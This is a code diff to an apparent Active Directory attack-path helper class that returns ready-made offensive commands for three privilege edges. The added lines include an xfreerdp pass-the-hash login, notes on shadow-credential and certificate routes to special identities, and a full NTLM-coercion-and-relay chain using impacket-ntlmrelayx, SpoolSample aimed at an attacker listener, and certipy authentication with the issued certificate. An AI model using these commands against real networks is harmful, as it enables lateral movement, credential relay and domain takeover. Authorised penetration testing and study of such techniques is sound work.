@@ -186,6 +186,39 @@ class CommandOracle:
                 f"# Alternatives: impacket-wmiexec {domain}/{username}@{target_host} / impacket-smbexec"
             )
 
+        # CanRDP
+        if normalized_edge == "CanRDP":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# CanRDP: open interactive RDP session to target host\n"
+                f"xfreerdp /u:{username} /d:{domain} /v:{target_host}\n"
+                "# Pass-the-hash variant (requires Restricted Admin mode on target)\n"
+                "xfreerdp /pth:<NTLM_HASH> /u:<USER> /d:<DOMAIN> /v:<TARGET_HOST>"
+            )
+
+        # ClaimSpecialIdentity
+        if normalized_edge == "ClaimSpecialIdentity":
+            return (
+                "# ClaimSpecialIdentity: obtain token with special identity SID via matching auth pathway\n"
+                "# Example routes:\n"
+                "# - Key Trust / MFA Key Property via PKINIT (shadow credentials)\n"
+                "# - NTLM Authentication SID via NTLM logon\n"
+                "# - Schannel Authentication SID via certificate auth\n"
+                "# Validate resulting token groups on target host (whoami /groups)"
+            )
+
+        # CoerceAndRelayNTLMToADCS
+        if normalized_edge == "CoerceAndRelayNTLMToADCS":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# CoerceAndRelayNTLMToADCS: coerce NTLM auth and relay to ADCS web enrollment\n"
+                "impacket-ntlmrelayx -t http://<ADCS_SERVER>/certsrv/ --adcs --template <TEMPLATE> -smb2support\n"
+                "# Trigger coercion from target (example)\n"
+                f"SpoolSample.exe {target_host} <ATTACKER_NETBIOS>@<PORT>/file.txt\n"
+                "# Then use issued certificate for auth\n"
+                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+            )
+
         # AddAllowedToAct / AllowedToAct (RBCD write primitive)
         if normalized_edge in ("AddAllowedToAct", "AllowedToAct"):
             target_computer = target.name or "<TARGET_COMPUTER>"
